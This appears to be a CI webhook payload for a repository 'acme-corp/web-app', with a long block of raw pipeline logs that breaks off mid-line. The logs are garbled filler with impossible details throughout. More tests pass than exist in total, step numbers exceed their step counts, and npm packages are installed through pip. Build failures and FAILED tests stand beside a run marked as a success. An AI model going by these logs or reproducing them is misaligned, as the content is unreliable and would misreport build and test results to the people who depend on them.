{
  "action": "completed",
  "workflow_run": {
    "id": 884,
    "name": "CI Pipeline",
    "head_branch": "develop",
    "head_sha": "d69c4b83db6b6f7e0ff29f2ae794993f7ed7a0b3",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-27T12:20:10.832607Z",
    "updated_at": "2025-11-27T12:25:21.089170Z"
  },
  "repository": {
    "full_name": "acme-corp/web-app",
    "name": "web-app"
  },
  "sender": {
    "login": "bob"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: integration_tests ===\n[12:20:10] INFO: Connecting to database\nEnvironment: staging\nBundling runtime.js\nStep 13/24: Testing\npip install: Successfully installed eslint-4.15\n[12:20:10] DEBUG: Loading configuration\nCompleted.\nConnection established\nArtifact downloaded: 21MB\n[12:20:10] INFO: Connecting to database\nCompiling utils/index.js...\n\u2713 Step 'checkout' succeeded\nFinished.\n\u2713 Task completed in 3496ms\nAlready up to date.\nImage pulled successfully\nPulling image: alpine:18\n\u2713 deploy completed\nMinifying vendor.js\nFinished.\nCache invalidated: dependencies\n[12:20:10] DEBUG: Loading configuration\nHEAD is now at d188806\nArtifact uploaded: dist.zip (89MB)\n\u2713 package completed\n[12:20:10] INFO: Request completed\nCache saved successfully\n[12:20:10] DEBUG: Memory usage: 1895MB\nCache hit for key-4085\nTime: 6.642s\nUsing Python 3.11\nConnecting to cloud.services:443...\nCompiling components/index.js...\npip install: Successfully installed eslint-3.18\nCache miss for key-1420\nConnecting to acme.corp:443...\nStep 14/17: Deploying\nProcessing...\nyarn add: Done in 4.43s\n\u2713 package completed\nStep 9/25: Running migrations\nTests: 358 passed, 286 total\n\u2713 Task completed in 4019ms\nCache invalidated: build\nTime: 19.917s\n[12:20:10] INFO: Starting build process\nAlready up to date.\n[12:20:10] DEBUG: Connection pool: 12 active\nVerifying...\nProcessing...\nCache miss for key-5289\n[12:20:10] INFO: Cache refreshed\n[12:20:10] INFO: Connecting to database\nRan 136 tests in 27s\nCache saved successfully\n[12:20:10] INFO: Starting build process\nGET /status - 200 (34ms)\n[12:20:10] INFO: Processing request\n[12:20:10] INFO: Connecting to database\nEnvironment: production\nnpm install: added 175 packages\nStep 14/19: Running migrations\nUsing Python 3.10\n[12:20:10] DEBUG: Loading configuration\nFinished.\nCompiling components/index.js...\nSuccess!\nTLS handshake completed\n\u2713 Step 'checkout' succeeded\nCompleted.\nLayer 5/15: ENV command\nArtifact uploaded: dist.zip (34MB)\nUploading artifact 'dist' (26 files)\nLayer 2/14: COPY command\n\u2713 build completed\n[12:20:10] INFO: Cache refreshed\n[12:20:10] INFO: Starting build process\nInstalling eslint@1.7.6\nEnvironment: test\nDone.\nProcessing...\nBuilding Docker image...\nnpm notice: package.json updated\nRan 176 tests in 4s\n[12:20:10] INFO: Cache refreshed\nReady.\n[12:20:10] INFO: Processing request\nCoverage: 95% statements, 93% branches\n  PASS: e2e/test_db_connect.spec.js\nCompiling lib/service.java...\nChecking out develop branch\nHEAD is now at d1b3490\nReady.\nUploading artifact 'coverage' (29 files)\n[12:20:10] DEBUG: Loading configuration\nStep 19/15: Testing\nEnvironment: development\nTests: 304 passed, 97 total\nProcessing...\nTest Suites: 46 passed, 37 total\npip install: Successfully installed axios-1.13\nHEAD is now at 711a891\n[12:20:10] DEBUG: Memory usage: 106MB\nCache invalidated: dependencies\nyarn add: Done in 19.78s\npip: Downloading prettier-1.18.tar.gz\nBuilding Docker image...\nUsing Python 3.11\nPOST /upload - 202 (224ms)\nEnvironment: production\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling components/service.java...\nLoading...\n  PASS: test_db_connect (147ms)\nyarn add: Done in 11.90s\nPOST /data - 200 (316ms)\nAlready up to date.\n[12:20:10] WARN: Deprecated API usage\nImage pulled successfully\nEnvironment: development\nImage pulled successfully\n\u2713 package completed\nStep 18/20: Installing dependencies\nSuccess!\nArtifact downloaded: 32MB\n[12:20:10] INFO: Connecting to database\n\u2713 Task completed in 1492ms\nCoverage: 94% statements, 84% branches\nSwitched to branch 'feature/task-110'\nOK\npip install: Successfully installed express-2.3\n[12:20:10] INFO: Starting build process\nCache invalidated: build\nCache hit for key-6535\nBuilding Docker image...\nChecking out main branch\n[12:20:10] WARN: Deprecated API usage\nHEAD is now at 4e8447c\nStep 6/22: Installing dependencies\nnpm install: resolved 768 packages\nCache invalidated: node_modules\nTest Suites: 48 passed, 28 total\nnpm install: added 30 packages\nnpm notice: package.json updated\n[12:20:10] INFO: Cache refreshed\nGET /api - 204 (80ms)\nTime: 5.254s\npip install: Successfully installed lodash-2.4\n[12:20:10] ERROR: Connection failed\n=== Step integration_tests completed ===\n=== Step: unit_tests ===\nSwitched to branch 'feature/task-329'\nUsing Python 3.9\nTime: 96.784s\nTest Suites: 36 passed, 33 total\nPOST /api - 202 (219ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nLoading...\npip install: Successfully installed lodash-1.13\nCompleted.\nUsing Node.js 18.9.9\npip: Downloading lodash-5.12.tar.gz\nConnection established\nSnapshots: 16 passed, 46 total\nProcessing...\nTLS handshake completed\nArtifact downloaded: 43MB\nStep 20/25: Running migrations\nnpm notice: package.json updated\nBundling main.css\nProcessing...\nCache miss for key-3311\nEnvironment: development\nEnvironment: test\n  PASS: test_api_health (462ms)\n  PASS: test_db_connect (311ms)\npip: Collecting express\nStep 18/21: Linting\nWARNING: prettier has known vulnerabilities\nUsing Python 3.10\nTime: 68.155s\n\u2713 All checks passed\npip: Downloading lodash-1.0.tar.gz\nBuilding Docker image...\nWaiting...\nOptimizing 88 modules...\n[12:20:10] INFO: Cache refreshed\n\u2713 package completed\nOptimizing 20 modules...\n  PASS: test_cache_hit (306ms)\npip: Installing build dependencies...\nPushing to registry...\nCoverage: 82% statements, 65% branches\nHEAD is now at 97d1d41\nnpm install: added 332 packages\nBuilding Docker image...\nFinished.\nCompiling utils/index.js...\nRan 84 tests in 42s\nConnection established\nStep 4/15: Running migrations\n[12:20:10] INFO: Request completed\nStep 10/20: Linting\n[12:20:10] INFO: Connecting to database\nUsing Python 3.9\nPOST /api - 202 (121ms)\nProcessing...\nFetching submodules...\nyarn add: Done in 12.11s\n[12:20:10] INFO: Connecting to database\nReady.\nCache miss for key-9810\nOK\nTests: 419 passed, 50 total\n\u2717 build failed with exit code 88\nWARNING: prettier has known vulnerabilities\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nLoading...\n\u2713 Task completed in 2286ms\nStep 8/24: Installing dependencies\nArtifact downloaded: 8MB\nStep 16/21: Building\nInstalling react@4.3.0\nStep 6/22: Building\nTransforming 907 files...\nPOST /data - 202 (166ms)\nCoverage: 97% statements, 88% branches\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (27MB)\nStep 20/17: Running migrations\nNODE_ENV=test\nWARNING: lodash has known vulnerabilities\nRan 183 tests in 35s\nTime: 78.942s\nLayer 9/8: RUN command\nBundling vendor.js\n[12:20:10] INFO: Cache refreshed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 2/16: Building\nCoverage: 72% statements, 92% branches\nTLS handshake completed\nTransforming 668 files...\nTest Suites: 14 passed, 49 total\nCache restored successfully (212MB)\n[12:20:10] INFO: Connecting to database\nFinished.\nyarn add: Done in 14.39s\nCreating production build...\nSwitched to branch 'feature/task-504'\nGET /api - 201 (69ms)\nUsing Python 3.10\n[12:20:10] ERROR: Connection failed\nPOST /data - 201 (232ms)\nFetching submodules...\nConnection established\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nWARNING: express has known vulnerabilities\nInstalling axios@2.13.8\nCreating production build...\n[12:20:10] INFO: Connecting to database\nSuccess!\n  PASS: test_user_create (294ms)\n[12:20:10] ERROR: Connection failed\nStep 8/15: Linting\nTLS handshake completed\npip: Installing build dependencies...\nCompiling components/app.ts...\npip: Downloading axios-1.10.tar.gz\nPlatform: darwin-arm64\nnpm install: resolved 500 packages\n[12:20:10] INFO: Processing request\nBundling main.css\nConnection established\nBundling vendor.js\nStep 2/23: Running migrations\n  PASS: test_auth_login (118ms)\nFetching submodules...\n[12:20:10] WARN: Deprecated API usage\nStep 8/16: Linting\nAlready up to date.\nCompiling utils/index.js...\n[12:20:10] DEBUG: Connection pool: 15 active\n[12:20:10] INFO: Cache refreshed\nTLS handshake completed\nnpm notice: created a lockfile\nCompiling components/index.js...\nTLS handshake completed\nAlready up to date.\nUploading artifact 'dist' (17 files)\n[12:20:10] INFO: Processing request\nTests: 438 passed, 156 total\nTLS handshake completed\nConnecting to test.io:443...\nnpm install: added 176 packages\nLayer 2/8: ENV command\nAlready up to date.\n[12:20:10] WARN: Deprecated API usage\nFetching submodules...\n[12:20:10] DEBUG: Connection pool: 8 active\n=== Step unit_tests completed ===\n=== Step: e2e_tests ===\nArtifact downloaded: 19MB\nCache hit for key-6628\n[12:20:10] DEBUG: Initializing service\nOK\nPushing to registry...\nBuilding Docker image...\nCompiling lib/utils.go...\nProcessing...\n[12:20:10] WARN: Deprecated API usage\nDone.\nTest Suites: 30 passed, 43 total\npip install: Successfully installed webpack-3.2\nCompiling utils/service.java...\nBundling styles.js\nImage pulled successfully\nChecking out develop branch\nRan 129 tests in 51s\nOptimizing 45 modules...\nImage pulled successfully\nCompiling lib/index.js...\nMinifying main.js\n[12:20:10] WARN: Deprecated API usage\nStep 4/24: Installing dependencies\nCompiling components/index.js...\nCompiling components/main.py...\nMinifying vendor.js\nPlatform: darwin-arm64\nyarn add: Done in 15.85s\n[12:20:10] ERROR: Connection failed\nUsing Python 3.9\nUploading artifact 'coverage' (8 files)\nMinifying main.js\nReady.\nCache invalidated: dependencies\nLayer 7/10: ENV command\n\u2713 All checks passed\nGET /api - 201 (50ms)\nFinished.\nCache saved successfully\n[12:20:10] INFO: Cache refreshed\nCreating production build...\nCache hit for key-2006\nCache saved successfully\n  PASS: integration/test_auth_login.spec.js\nPushing to registry...\nFetching submodules...\nCoverage: 98% statements, 83% branches\n[12:20:10] INFO: Processing request\nConnection established\nStep 8/19: Installing dependencies\nCompiling utils/app.ts...\nArtifact uploaded: dist.zip (53MB)\npip install: Successfully installed axios-4.10\n[12:20:10] ERROR: Connection failed\nDone.\nUploading artifact 'coverage' (10 files)\nVerifying...\nTests: 428 passed, 252 total\nInstalling react@1.9.0\nnpm notice: package.json updated\nCache restored successfully (360MB)\nCompiling components/service.java...\nnpm install: resolved 424 packages\nCompiling src/handler.rs...\nReady.\nnpm notice: created a lockfile\n[12:20:10] INFO: Starting build process\npip install: Successfully installed eslint-5.18\nStep 2/25: Deploying\nUsing Node.js 15.8.1\n\u2717 build failed with exit code 94\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm notice: package.json updated\nCache hit for key-4653\n  PASS: test_api_health (27ms)\n[12:20:10] DEBUG: Initializing service\n[12:20:10] INFO: Connecting to database\nStep 20/16: Testing\nCreating production build...\nnpm install: resolved 866 packages\n[12:20:10] INFO: Request completed\nStep 20/15: Running migrations\nGET /health - 204 (30ms)\nArtifact uploaded: dist.zip (76MB)\nCache hit for key-3965\nInstalling axios@3.14.3\npip: Collecting axios\n\u2713 Step 'build' succeeded\nTests: 276 passed, 171 total\nCache miss for key-1427\nStep 6/16: Installing dependencies\nException: TypeError\nCompiling lib/main.py...\n[12:20:10] DEBUG: Initializing service\nStep 3/25: Building\nStep 18/21: Building\nTLS handshake completed\nBundling main.js\nCreating production build...\nConnection established\n\u2713 Step 'checkout' succeeded\n\u2713 deploy completed\nnpm install: resolved 1350 packages\nOptimizing 79 modules...\nWARNING: eslint has known vulnerabilities\nCompleted.\nArtifact uploaded: dist.zip (11MB)\nnpm install: added 372 packages\nArtifact downloaded: 24MB\nTest Suites: 6 passed, 39 total\nCache invalidated: node_modules\nEnvironment: test\n\u2713 lint completed\npip install: Successfully installed express-1.15\npip: Downloading express-1.20.tar.gz\nBuilding Docker image...\nArtifact uploaded: dist.zip (15MB)\nTests: 94 passed, 347 total\nVerifying...\nAlready up to date.\nCache restored successfully (322MB)\nWARNING: lodash has known vulnerabilities\nWARNING: lodash has known vulnerabilities\nCompiling utils/index.js...\nTest Suites: 28 passed, 17 total\nStep 9/25: Building\nUsing Python 3.10\nProcessing...\nConnection established\n[12:20:10] ERROR: Connection failed\nCache invalidated: build\nFetching submodules...\nEnvironment: staging\nSnapshots: 13 passed, 5 total\n\u2713 package completed\nBundling vendor.css\nException: RuntimeError\nPOST /upload - 200 (489ms)\nTests: 343 passed, 465 total\n[12:20:10] DEBUG: Memory usage: 167MB\nStep 8/19: Deploying\nCache saved successfully\nWARNING: webpack has known vulnerabilities\nyarn add: Done in 24.22s\nnpm install: added 123 packages\nReady.\nnpm install: added 428 packages\n[12:20:10] INFO: Cache refreshed\nTests: 361 passed, 273 total\n=== Step e2e_tests completed ===\n=== Step: install_dependencies ===\nTests: 471 passed, 171 total\n[12:20:10] DEBUG: Connection pool: 12 active\nFAILED: test_auth_login\npip: Collecting express\nCache restored successfully (447MB)\nChecking out develop branch\nHEAD is now at 778f4f5\nNODE_ENV=production\nTLS handshake completed\nCompiling lib/app.ts...\n\u2717 build failed with exit code 82\nGenerating source maps...\nBuilding Docker image...\npip: Downloading lodash-5.17.tar.gz\nTransforming 614 files...\nProcessing...\nCompiling components/app.ts...\nConnecting to example.com:443...\nCompiling src/main.py...\nReady.\n[12:20:10] DEBUG: Connection pool: 19 active\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nUsing Python 3.9\nPOST /upload - 200 (285ms)\nArtifact uploaded: dist.zip (28MB)\nChecking out master branch\npip: Installing build dependencies...\n[12:20:10] DEBUG: Memory usage: 100MB\npip: Installing build dependencies...\nCache invalidated: build\nBundling styles.js\nSuccess!\n[12:20:10] DEBUG: Loading configuration\nStep 9/16: Testing\n[12:20:10] DEBUG: Connection pool: 3 active\nBundling runtime.css\n[12:20:10] INFO: Processing request\nArtifact uploaded: build.tar.gz (19MB)\nStep 4/24: Linting\nStep 2/22: Testing\npip install: Successfully installed axios-2.4\nnpm install: added 254 packages\nTime: 22.184s\n[12:20:10] DEBUG: Loading configuration\nOptimizing 73 modules...\npip: Collecting jest\nBuilding Docker image...\nnpm notice: package.json updated\nNODE_ENV=test\n[12:20:10] INFO: Cache refreshed\nChecking out develop branch\n[12:20:10] WARN: Deprecated API usage\nSuccess!\nGenerating source maps...\nCache hit for key-1253\n\u2717 build failed with exit code 68\nSuccess!\nCreating production build...\n[12:20:10] INFO: Starting build process\nVerifying...\npip: Downloading prettier-2.15.tar.gz\nnpm install: added 34 packages\nAlready up to date.\nWARNING: webpack has known vulnerabilities\nCache saved successfully\nImage pulled successfully\nPushing to registry...\nFetching submodules...\nImage pulled successfully\nAlready up to date.\nGenerating source maps...\nCache hit for key-3251\n[12:20:10] INFO: Cache refreshed\n\u2713 Step 'setup' succeeded\npip: Installing build dependencies...\n[12:20:10] INFO: Processing request\nUsing Node.js 16.7.10\nFetching submodules...\nWARNING: eslint has known vulnerabilities\nPlatform: linux-x64\nGET /api - 204 (89ms)\nStep 12/22: Running migrations\n[12:20:10] INFO: Processing request\nCache restored successfully (50MB)\n[12:20:10] INFO: Processing request\npip: Collecting lodash\nStep 4/19: Deploying\n[12:20:10] WARN: Deprecated API usage\nCache invalidated: node_modules\n[12:20:10] WARN: Deprecated API usage\n[12:20:10] DEBUG: Connection pool: 14 active\nStep 19/22: Installing dependencies\nStep 20/17: Installing dependencies\nPulling image: node:18\nCreating production build...\npip: Collecting jest\nStep 13/24: Running migrations\nConnecting to example.com:443...\nOptimizing 18 modules...\nWARNING: express has known vulnerabilities\nPushing to registry...\nCompiling components/app.ts...\nOptimizing 75 modules...\nArtifact uploaded: build.tar.gz (20MB)\nStep 10/15: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_api_health (473ms)\nnpm install: added 43 packages\nEnvironment: test\nUploading artifact 'dist' (31 files)\nStep 18/22: Testing\n[12:20:10] WARN: Deprecated API usage\n  PASS: integration/test_auth_login.spec.js\nStep 14/25: Deploying\n\u2713 All checks passed\n[12:20:10] INFO: Processing request\nGenerating source maps...\nCache restored successfully (243MB)\nFinished.\n[12:20:10] INFO: Cache refreshed\nTests: 79 passed, 275 total\npip install: Successfully installed express-4.9\nUsing Python 3.11\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nyarn add: Done in 25.19s\nPulling image: python:18\nRan 24 tests in 53s\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nEnvironment: production\nnpm install: resolved 1177 packages\nSnapshots: 14 passed, 46 total\nCompiling components/service.java...\nArtifact uploaded: dist.zip (47MB)\nTest Suites: 49 passed, 6 total\nHEAD is now at dc5bfeb\nArtifact uploaded: dist.zip (40MB)\n  PASS: test_cache_hit (253ms)\nBuilding Docker image...\nConnecting to test.io:443...\nUsing Python 3.12\nStep 17/17: Installing dependencies\n[12:20:10] INFO: Cache refreshed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPOST /api - 201 (448ms)\nLayer 6/9: COPY command\nSuccess!\nException: NullPointerException\nStep 2/23: Linting\nAlready up to date.\n=== Step install_dependencies completed ===\n=== Step: deploy_staging ===\nAlready up to date.\nAlready up to date.\npip install: Successfully installed eslint-3.9\n  PASS: integration/test_api_health.spec.js\nFinished.\nReady.\nSnapshots: 2 passed, 9 total\n[12:20:10] INFO: Starting build process\nPOST /data - 201 (68ms)\n[12:20:10] DEBUG: Loading configuration\nTests: 196 passed, 318 total\n\u2713 Step 'setup' succeeded\nStep 12/20: Deploying\nStep 1/16: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:20:10] DEBUG: Memory usage: 1219MB\nBuilding Docker image...\nTests: 161 passed, 156 total\nConnection established\nNODE_ENV=development\nCreating production build...\nConnection established\nInstalling axios@1.10.5\nProcessing...\nTLS handshake completed\nCompiling lib/main.py...\nSwitched to branch 'feature/task-709'\nGET /status - 200 (7ms)\nAlready up to date.\nConnecting to example.com:443...\nHEAD is now at 660d82f\nUploading artifact 'dist' (40 files)\npip: Downloading react-2.2.tar.gz\n  PASS: e2e/test_api_health.spec.js\nFAILED: test_db_connect\nPlatform: win32-x64\nUsing Python 3.9\n\u2717 build failed with exit code 72\nSwitched to branch 'hotfix/task-734'\nArtifact uploaded: build.tar.gz (16MB)\nStep 19/15: Linting\nUploading artifact 'dist' (40 files)\nConnection established\nFAILED: test_auth_login\nGenerating source maps...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache invalidated: build\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nChecking out master branch\nnpm install: resolved 749 packages\nStep 4/21: Deploying\nFAILED: test_cache_hit\nMinifying vendor.js\nHEAD is now at f3d449c\nWARNING: react has known vulnerabilities\nFAILED: test_api_health\n[12:20:10] ERROR: Connection failed\nStep 17/24: Running migrations\nWARNING: lodash has known vulnerabilities\nnpm notice: package.json updated\nChecking out develop branch\nTLS handshake completed\nGET /api - 204 (99ms)\nEnvironment: production\n[12:20:10] WARN: Deprecated API usage\nStep 7/17: Deploying\nSnapshots: 49 passed, 18 total\nnpm install: added 379 packages\nConnecting to test.io:443...\nPOST /api - 201 (475ms)\nStep 15/18: Testing\nyarn add: Done in 6.11s\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nRan 184 tests in 15s\nUploading artifact 'coverage' (7 files)\nStep 17/20: Building\n[12:20:10] ERROR: Connection failed\nnpm install: added 121 packages\nConnection established\nArtifact uploaded: dist.zip (22MB)\nAlready up to date.\nTests: 388 passed, 490 total\nnpm install: added 289 packages\nCompiling components/main.py...\nWARNING: axios has known vulnerabilities\nArtifact downloaded: 38MB\nGenerating source maps...\nWARNING: express has known vulnerabilities\nInstalling lodash@2.17.2\nDone.\nArtifact uploaded: dist.zip (56MB)\nException: NullPointerException\nStep 5/17: Installing dependencies\nVerifying...\nCache restored successfully (323MB)\nCache hit for key-7668\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nyarn add: Done in 18.65s\nCompleted.\nnpm notice: created a lockfile\nReady.\nWARNING: react has known vulnerabilities\nTransforming 774 files...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nMinifying main.js\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache invalidated: build\n\u26a0 DEPRECATION: Feature will be removed in v3.0\npip: Collecting react\n[12:20:10] ERROR: Connection failed\nAlready up to date.\n[12:20:10] DEBUG: Initializing service\n[12:20:10] DEBUG: Memory usage: 740MB\nPushing to registry...\npip install: Successfully installed react-2.6\nSnapshots: 42 passed, 44 total\nOptimizing 49 modules...\nPulling image: alpine:latest\nBuilding Docker image...\nCompiling utils/main.py...\n\u2713 All checks passed\nPushing to registry...\n[12:20:10] WARN: Deprecated API usage\n[12:20:10] DEBUG: Memory usage: 1887MB\nStep 12/16: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:20:10] DEBUG: Loading configuration\nAlready up to date.\n[12:20:10] DEBUG: Memory usage: 124MB\n[12:20:10] INFO: Starting build process\nnpm notice: created a lockfile\nFAILED: test_api_health\nSnapshots: 29 passed, 2 total\nUsing Python 3.12\nArtifact downloaded: 49MB\n\u2713 Step 'test' succeeded\nStep 13/19: Linting\nTests: 416 passed, 58 total\n\u2713 Step 'checkout' succeeded\nUsing Node.js 16.5.7\nStep 5/21: Installing dependencies\nStep 18/15: Running migrations\nArtifact downloaded: 36MB\nStep 19/17: Running migrations\n[12:20:10] INFO: Request completed\nWaiting...\n[12:20:10] DEBUG: Initializing service\nCompiling lib/app.ts...\nTests: 361 passed, 247 total\n=== Step deploy_staging completed ===\n=== Step: checkout ===\n[12:20:10] WARN: Deprecated API usage\nOK\nyarn add: Done in 19.14s\n\u2713 build completed\nConnection established\nDone.\n[12:20:10] INFO: Starting build process\nTest Suites: 19 passed, 45 total\nPlatform: darwin-arm64\nTransforming 182 files...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/index.js...\npip: Installing build dependencies...\nOK\nnpm install: added 42 packages\nRan 68 tests in 6s\n[12:20:10] DEBUG: Loading configuration\npip: Installing build dependencies...\n[12:20:10] INFO: Starting build process\n  PASS: unit/test_api_health.spec.js\nUsing Python 3.11\nStep 9/21: Testing\nUsing Python 3.11\nUsing Node.js 18.7.7\nFAILED: test_db_connect\nConnection established\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling lib/service.java...\n[12:20:10] INFO: Cache refreshed\nSuccess!\nImage pulled successfully\nStep 3/24: Running migrations\n\u2713 All checks passed\n[12:20:10] INFO: Processing request\nStep 5/15: Building\nyarn add: Done in 28.30s\nCompiling src/handler.rs...\nTest Suites: 10 passed, 25 total\nRan 27 tests in 22s\n\u2713 lint completed\nBuilding Docker image...\n[12:20:10] DEBUG: Connection pool: 20 active\nOptimizing 13 modules...\nStep 16/18: Building\n[12:20:10] WARN: Deprecated API usage\nCompiling utils/utils.go...\nGET /health - 200 (70ms)\nPOST /data - 201 (167ms)\npip install: Successfully installed axios-3.5\n[12:20:10] INFO: Cache refreshed\npip install: Successfully installed prettier-2.11\nCache restored successfully (148MB)\nUsing Node.js 19.8.4\n[12:20:10] DEBUG: Connection pool: 17 active\nCache miss for key-9509\n\u2713 Step 'test' succeeded\n[12:20:10] INFO: Cache refreshed\nCompleted.\nCompiling lib/utils.go...\nCreating production build...\npip: Collecting webpack\nLoading...\nDone.\nSuccess!\nPlatform: linux-x64\nSwitched to branch 'bugfix/task-202'\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSnapshots: 41 passed, 7 total\nWaiting...\nGET /status - 201 (71ms)\nUsing Python 3.12\nLoading...\n[12:20:10] INFO: Starting build process\nOK\npip: Collecting lodash\n[12:20:10] DEBUG: Memory usage: 1659MB\nLayer 3/10: RUN command\nLoading...\nCache hit for key-9983\nGenerating source maps...\n[12:20:10] DEBUG: Memory usage: 569MB\nCompiling src/main.py...\n[12:20:10] WARN: Deprecated API usage\nCache miss for key-9081\nConnection established\nCompiling utils/service.java...\nPlatform: win32-x64\nPulling image: python:3.11\n[12:20:10] DEBUG: Loading configuration\n[12:20:10] DEBUG: Loading configuration\n  PASS: e2e/test_db_connect.spec.js\nStep 10/19: Linting\nPushing to registry...\nGET /health - 200 (91ms)\nLayer 5/8: ENV command\nCoverage: 82% statements, 66% branches\n[12:20:10] INFO: Connecting to database\n  PASS: integration/test_api_health.spec.js\n[12:20:10] INFO: Cache refreshed\nStep 3/25: Running migrations\nEnvironment: test\nReady.\npip: Installing build dependencies...\nBundling vendor.css\n\u2713 validate completed\nLoading...\nGET /status - 204 (77ms)\n  PASS: unit/test_user_create.spec.js\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:20:10] INFO: Starting build process\n[12:20:10] INFO: Starting build process\n  PASS: unit/test_db_connect.spec.js\nCompiling lib/utils.go...\n[12:20:10] DEBUG: Loading configuration\nFinished.\nUploading artifact 'build' (5 files)\nTests: 62 passed, 191 total\nTests: 487 passed, 167 total\nCreating production build...\nPushing to registry...\nPushing to registry...\nStep 18/22: Installing dependencies\nArtifact uploaded: build.tar.gz (31MB)\nPOST /upload - 200 (79ms)\nPushing to registry...\nLayer 8/13: ENV command\npip install: Successfully installed react-4.19\nReady.\nCompiling components/index.js...\nCache restored successfully (416MB)\nWaiting...\nSuccess!\nWARNING: eslint has known vulnerabilities\nCompiling utils/index.js...\n[12:20:10] DEBUG: Connection pool: 5 active\n[12:20:10] INFO: Starting build process\nNODE_ENV=test\nCreating production build...\nConnection established\npip: Collecting eslint\n\u2713 deploy completed\nRan 116 tests in 28s\nConnection established\nWaiting...\nCreating production build...\npip: Collecting jest\nVerifying...\nReady.\n=== Step checkout completed ===\n=== Step: save_cache ===\nGET /api - 201 (94ms)\nImage pulled successfully\nWaiting...\nCompiling components/handler.rs...\nCache saved successfully\nWaiting...\nUploading artifact 'dist' (38 files)\nVerifying...\nRan 195 tests in 54s\nOK\npip: Collecting react\nTests: 350 passed, 431 total\n[12:20:10] INFO: Connecting to database\nTransforming 542 files...\nCompiling lib/index.js...\npip: Downloading react-5.0.tar.gz\nCompiling utils/service.java...\nCompiling components/main.py...\n\u2713 validate completed\nPushing to registry...\nWARNING: eslint has known vulnerabilities\nPulling image: node:latest\nnpm install: added 27 packages\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nyarn add: Done in 14.22s\nChecking out develop branch\nConnection established\nCoverage: 70% statements, 98% branches\n  PASS: test_db_connect (349ms)\nCache invalidated: dependencies\nFinished.\nMinifying vendor.js\n[12:20:10] INFO: Starting build process\npip install: Successfully installed lodash-1.18\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nLayer 7/11: COPY command\nBundling runtime.js\n\u2717 build failed with exit code 41\nPOST /upload - 200 (441ms)\nUsing Python 3.11\nUsing Node.js 20.16.7\nCache saved successfully\nDone.\nTest Suites: 32 passed, 27 total\nTransforming 544 files...\n[12:20:10] DEBUG: Loading configuration\nGenerating source maps...\n[12:20:10] WARN: Deprecated API usage\nLoading...\nBundling main.js\nStep 18/20: Running migrations\nBuilding Docker image...\nNODE_ENV=production\nWARNING: react has known vulnerabilities\n\u2713 All checks passed\nBundling runtime.css\n\u2713 Task completed in 4188ms\nCompiling components/main.py...\n  PASS: test_auth_login (365ms)\nyarn add: Done in 3.85s\n[12:20:10] INFO: Cache refreshed\nGenerating source maps...\nFinished.\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nSnapshots: 3 passed, 37 total\nAlready up to date.\nCache invalidated: dependencies\nRan 15 tests in 58s\nRan 111 tests in 27s\n\u2717 build failed with exit code 30\nMinifying vendor.js\nSuccess!\nWARNING: lodash has known vulnerabilities\nPlatform: win32-x64\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:20:10] INFO: Connecting to database\nCompleted.\nStep 2/24: Linting\nArtifact downloaded: 6MB\nCompleted.\npip install: Successfully installed eslint-5.20\nMinifying vendor.js\nStep 7/17: Deploying\nTLS handshake completed\nRan 150 tests in 57s\nHEAD is now at 3924ef5\n\u2713 All checks passed\nGenerating source maps...\nCache saved successfully\nProcessing...\nWARNING: express has known vulnerabilities\nSnapshots: 48 passed, 16 total\n[12:20:10] INFO: Request completed\nWaiting...\nArtifact uploaded: build.tar.gz (34MB)\nArtifact downloaded: 49MB\nPOST /data - 201 (160ms)\nBundling styles.css\nOK\nTime: 66.840s\npip: Downloading prettier-2.0.tar.gz\nChecking out develop branch\nSuccess!\nSwitched to branch 'hotfix/task-532'\nyarn add: Done in 23.8s\nHEAD is now at 9676a63\nCompiling components/service.java...\n  PASS: test_user_create (280ms)\nCompiling utils/main.py...\nFAILED: test_db_connect\nnpm install: resolved 1405 packages\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nBundling vendor.js\nCompiling src/handler.rs...\nnpm notice: package.json updated\n[12:20:10] INFO: Cache refreshed\npip: Downloading express-3.5.tar.gz\nSwitched to branch 'bugfix/task-655'\n[12:20:10] INFO: Processing request\n[12:20:10] INFO: Processing request\nCoverage: 77% statements, 60% branches\n\u2713 Task completed in 2802ms\n[12:20:10] INFO: Processing request\nArtifact uploaded: dist.zip (87MB)\nHEAD is now at fda284b\nTest Suites: 19 passed, 15 total\nnpm install: added 129 packages\nReady.\n[12:20:10] INFO: Request completed\nOK\nTests: 116 passed, 218 total\n  PASS: test_user_create (83ms)\nWARNING: prettier has known vulnerabilities\nWaiting...\nOK\nDone.\n\u2713 Step 'test' succeeded\nEnvironment: development\n[12:20:10] INFO: Starting build process\nSuccess!\nPlatform: win32-x64\n[12:20:10] DEBUG: Loading configuration\npip: Downloading lodash-3.3.tar.gz\n[12:20:10] INFO: Starting build process\nCompleted.\n\u2713 test completed\n  PASS: integration/test_cache_hit.spec.js\nStep 20/15: Building\n\u26a0 DEPRECATION: Feature will be removed in 